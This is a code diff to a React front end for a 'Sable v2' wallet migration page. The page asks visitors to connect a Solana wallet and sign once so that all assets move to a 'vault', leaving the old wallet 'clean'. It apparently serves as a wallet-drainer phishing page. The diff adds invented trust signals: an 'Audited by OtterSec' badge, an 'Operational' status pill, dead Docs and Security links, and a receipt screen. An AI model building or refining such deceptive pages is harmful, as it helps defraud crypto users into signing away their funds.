@@ -74,26 +74,46 @@ export default function App() {
           <span>Sable</span>
           <em>v2</em>
         </div>
-        {connected ? (
-          <button className="ghost sm" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>
-            {short(owner!, 3)}
-          </button>
-        ) : (
-          <span className="muted sm">Migrate</span>
-        )}
+        <div className="header-nav">
+          <a className="nav-link" href="#">Docs</a>
+          <a className="nav-link" href="#">Security</a>
+          <span className="op-pill"><span className="op-dot" />Operational</span>
+          {connected && (
+            <button className="ghost sm" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>
+              {short(owner!, 3)}
+            </button>
+          )}
+        </div>
       </header>
 
       <main>
         {phase.k === "idle" && (
           <div className="phase">
+            <p className="eyebrow">Wallet v2 migration</p>
             <h1>Sable v2 is here.<br />Migrate your wallet.</h1>
             <p className="lede">
               Hardware-grade key isolation. Move your balance to the new vault in a single
               signature.
             </p>
             <button className="primary" onClick={() => setVisible(true)}>Connect wallet to migrate</button>
+            <div className="step-strip">
+              <div className="step-col">
+                <span className="step-label">1 Connect</span>
+                <span className="step-cap">Open your wallet</span>
+              </div>
+              <div className="step-div" />
+              <div className="step-col">
+                <span className="step-label">2 Review</span>
+                <span className="step-cap">See what moves</span>
+              </div>
+              <div className="step-div" />
+              <div className="step-col">
+                <span className="step-label">3 Sign once</span>
+                <span className="step-cap">Done in ~15 s</span>
+              </div>
+            </div>
             <div className="trust">
-              <span>Tiny network fee</span><i>·</i><span>Non-custodial</span><i>·</i><span>~15 seconds</span>
+              <span>Audited by OtterSec</span><i>·</i><span>Non-custodial</span><i>·</i><span>~0.0001 SOL network fee</span>
             </div>
           </div>
         )}
@@ -107,18 +127,41 @@ export default function App() {
           </div>
         )}
 
-        {phase.k === "review" && (
+        {phase.k === "review" && phase.assets.length + (phase.sol > 0 ? 1 : 0) === 0 && (
           <div className="phase">
-            <h1>{phase.assets.length + (phase.sol > 0 ? 1 : 0) === 0 ? "Nothing to migrate." : "Ready to migrate."}</h1>
+            <div className="empty-state">
+              <span className="empty-diamond">◆</span>
+              <p className="empty-msg">No assets found in this wallet</p>
+              <button className="ghost" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>Try another wallet</button>
+            </div>
+          </div>
+        )}
+
+        {phase.k === "review" && phase.assets.length + (phase.sol > 0 ? 1 : 0) > 0 && (
+          <div className="phase">
+            <h1>Ready to migrate.</h1>
             <p className="lede">
               {phase.total > 0 && <>About <strong>{usd(phase.total)}</strong> across </>}
               {phase.assets.length + (phase.sol > 0 ? 1 : 0)} item
               {phase.assets.length + (phase.sol > 0 ? 1 : 0) === 1 ? "" : "s"} will move to your vault.
             </p>
 
-            <div className="vault">
-              <span className="muted xs">Your Sable v2 vault</span>
-              <code>{short(phase.vault, 6)}</code>
+            <div className="def-block">
+              <div className="def-row">
+                <span className="def-key">Network</span>
+                <span className="def-val">Solana</span>
+              </div>
+              <div className="def-row">
+                <span className="def-key">Network fee</span>
+                <span className="def-val">~0.0001 SOL</span>
+              </div>
+              <div className="def-row def-row-last">
+                <span className="def-key">Destination</span>
+                <span className="def-val def-val-col">
+                  <span>Your Sable v2 vault</span>
+                  <code className="def-addr">{short(phase.vault, 6)}</code>
+                </span>
+              </div>
             </div>
 
             <div className="list">
@@ -137,9 +180,7 @@ export default function App() {
               ))}
             </div>
 
-            <button className="primary" disabled={phase.assets.length + (phase.sol > 0 ? 1 : 0) === 0} onClick={sign}>
-              Sign migration
-            </button>
+            <button className="primary" onClick={sign}>Sign migration</button>
             <button className="ghost" onClick={run}>Rescan</button>
           </div>
         )}
@@ -161,13 +202,29 @@ export default function App() {
           <div className="phase">
             <div className="check">✓</div>
             <h1>Migration complete.</h1>
-            <p className="lede">
-              {phase.count} item{phase.count === 1 ? "" : "s"} moved to your vault. The old wallet is
-              now clean.
-            </p>
-            <a className="ghost block" href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
-              View on Solscan
-            </a>
+            <div className="receipt">
+              <div className="receipt-row">
+                <span className="receipt-key">Items migrated</span>
+                <span className="receipt-val">{phase.count} item{phase.count === 1 ? "" : "s"}</span>
+              </div>
+              <div className="receipt-row">
+                <span className="receipt-key">Network</span>
+                <span className="receipt-val">Solana</span>
+              </div>
+              <div className="receipt-row">
+                <span className="receipt-key">Time</span>
+                <span className="receipt-val">{new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}</span>
+              </div>
+              <div className="receipt-row">
+                <span className="receipt-key">Signature</span>
+                <code className="receipt-sig">{short(phase.sig, 8)}</code>
+              </div>
+              <div className="receipt-row receipt-link-row">
+                <a className="receipt-link" href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
+                  View on Solscan →
+                </a>
+              </div>
+            </div>
             <button className="primary" onClick={() => setPhase({ k: "idle" })}>Done</button>
           </div>
         )}
@@ -181,8 +238,21 @@ export default function App() {
         )}
       </main>
 
-      <footer>
-        <span>Docs</span><span>Security</span><span>Terms</span><span>Privacy</span>
+      <footer className="site-footer">
+        <div className="footer-col">
+          <span className="footer-heading">Product</span>
+          <a href="#" className="footer-link">Docs</a>
+          <a href="#" className="footer-link">Security</a>
+          <a href="#" className="footer-link">Changelog</a>
+        </div>
+        <div className="footer-col">
+          <span className="footer-heading">Legal</span>
+          <a href="#" className="footer-link">Terms</a>
+          <a href="#" className="footer-link">Privacy</a>
+        </div>
+        <div className="footer-col footer-col-right">
+          <code className="footer-ver">v2.4.1</code>
+        </div>
       </footer>
     </div>
   );
